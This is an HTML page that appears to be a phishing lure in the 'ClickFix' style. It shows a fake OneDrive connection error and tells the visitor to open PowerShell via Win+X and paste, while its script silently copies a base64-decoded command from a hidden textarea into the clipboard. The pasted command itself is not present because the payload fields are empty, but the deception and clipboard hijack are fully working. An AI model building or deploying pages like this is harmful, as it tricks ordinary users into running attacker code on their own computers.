<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
	<title></title>
	<style>

	body
	{
		font-family: "Segoe UI Light", Arial, sans-serif;
		height: 100%;
		width: 100%;
		background-image: url("data:image/gif;base64,");
		background-repeat: no-repeat;
		background-size: cover;
	}

	.Ot
	{
		display: none;
		position: fixed;
		top: 50%;
		left: 50%;
		transform: translate(-50%, -50%);
		background-color: #0078d4;
		border: 1px solid #fff;
		padding: 20px;
		box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
		max-width: 35%;
	}

	.gZ
	{
		display: block;
		width: 50px;
		height: 50px;
		border: 3px solid #3498db;
		border-radius: 50%;
		border-top: 3px solid #e74c3c;
		animation: spin 1s linear infinite;
		margin: 0 auto;
	}

	.Fn
	{
		display: none;
	}

	@keyframes spin
	{
		0% { transform: rotate(0deg); }
		100% { transform: rotate(360deg); }
	}

	#hidden-content
	{
		display: none;
		font-size: 14px;
		color: #ffffff;
	}

	.error-box
	{
		font-size: 1em;
		border-radius: 0.25em;
		padding: 1em 1.25em 1.25em;
		color: #ffffff;
		background-color: #0078d4;
	}

	.error-box h2
	{
		font-size: 1.4em;
		font-weight: normal;
		margin: 0 0 0.6em;
		opacity: 0.95;
	}

	.error-box p
	{
		font-size: 1.0em;
		margin: 0 0 0.5em;
		opacity: 0.85;
	}

	.error-box:before
	{
		content: ':(';
		float: right;
		font-size: 2.5em;
		padding: 0.15em 0.3em;
		font-weight: bold;
	}


	.white-button
	{
		display: inline-block;
		padding: 10px 20px;
		font-size: 16px;
		text-align: center;
		text-decoration: none;
		color: #000;
		background-color: #fff;
		border: 1px solid #ccc;
		border-radius: 5px;
		cursor: pointer;
		transition: background-color 0.3s ease;
	}

	.white-button:hover
	{
		background-color: #f0f0f0;
	}

	.icon
	{
		width: 16px;
		height: 16px;
		margin-right: 5px;
	}

	#buttons
	{
		flex-direction: column;
		align-items: center;
		text-align: center;
	}

	</style>
</head>
<body>

<div class="Ot" id="HF">
	<div class="gZ" id="gZ"></div>
	<div class="Fn" id="Fn">

		<div class="error-box">
			<h2><b>Error 0x8004de86.</b></h2>
			<p>Failed to connect to the "OneDrive" cloud service, to fix the error, you need to update the DNS cache manually.</p>
  
			<p id="hidden-content">
				Use <b><img src="data:image/png;base64," class="icon"> + X</b> keyboard shortcut, and then use <b>"Windows Powershell/Terminal"</b>, click <b>"Ctrl + V"</b> & <b>"Enter"</b> in the appeared window.
			</p>
		</div>

		<div id="buttons">
			<a href="#" class="white-button" onclick="ub()">How to fix</a>&nbsp;&nbsp;
			<a href="https://learn.microsoft.com/en-us/windows-server/networking/dns/troubleshoot/troubleshoot-dns-server" target="_blank" class="white-button">Details</a>
		</div>

		<textarea id="WG" cols="1" rows="1" style="margin: -400px;"></textarea>

	</div>
</div>

<script>

	function ub()
	{
		var qR = document.getElementById("hidden-content");
		qR.style.display = "block";
		var jQ = document.getElementById("WG");
		jQ.select();
		document.execCommand("copy");
		window.getSelection().removeAllRanges();
	}

	$(document).ready(function()
	{
		var ide = $(this).attr("title");
		var BU = atob(ide);

		$("#WG").val(BU);
		$("#HF").css("display", "block");

		setTimeout(function()
		{
			$("#gZ").css("display", "none");
			$("#Fn").css("display", "block");
		}, 2000);

		$(document).on("click", function(event)
		{
			if(!$(event.target).closest("#HF").length)
			{
				alert('Failed to connect to the "OneDrive" cloud service');
			}
		});
	});

</script>
</body>
</html>